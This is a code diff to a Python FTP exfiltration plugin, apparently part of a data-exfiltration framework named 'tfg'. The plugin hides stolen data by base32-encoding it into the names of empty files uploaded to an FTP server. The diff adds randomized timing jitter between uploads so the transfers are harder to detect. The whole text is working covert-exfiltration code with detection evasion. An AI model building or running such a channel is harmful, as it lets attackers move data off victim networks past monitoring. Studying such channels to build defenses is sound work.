@@ -1,7 +1,7 @@
 from __future__ import annotations
 from typing import Dict, Any, Iterable
 from ftplib import FTP, FTP_TLS, error_perm
-import io, base64
+import io, base64, time, random
 
 from tfg.plugins.api import ExfilClientPlugin
 
@@ -59,6 +59,8 @@ class FtpClientNames(ExfilClientPlugin):
     def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
         root = config.get("root") or "/"
         exfil_id = config.get("exfil_id") or "tfg"
+        ritmo_base = int(config.get("ritmo_base_ms") or 0)
+        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
 
         ftp = _connect_ftp(config)
         if root and root != "/":
@@ -77,14 +79,17 @@ class FtpClientNames(ExfilClientPlugin):
                 part = bytes(buf[:RAW_SLICE])
                 del buf[:RAW_SLICE]
                 token = b32(part)
-                # file is EMPTY; info va en el nombre
                 name = f"{exfil_id}.{seq:06d}.{token}"
+                if ritmo_base or ritmo_disp:
+                    time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                 ftp.storbinary(f"STOR {name}", io.BytesIO(b""))
                 total += len(part)
                 seq += 1
         if buf:
             token = b32(bytes(buf))
             name = f"{exfil_id}.{seq:06d}.{token}"
+            if ritmo_base or ritmo_disp:
+                time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
             ftp.storbinary(f"STOR {name}", io.BytesIO(b""))
             total += len(buf)
             seq += 1
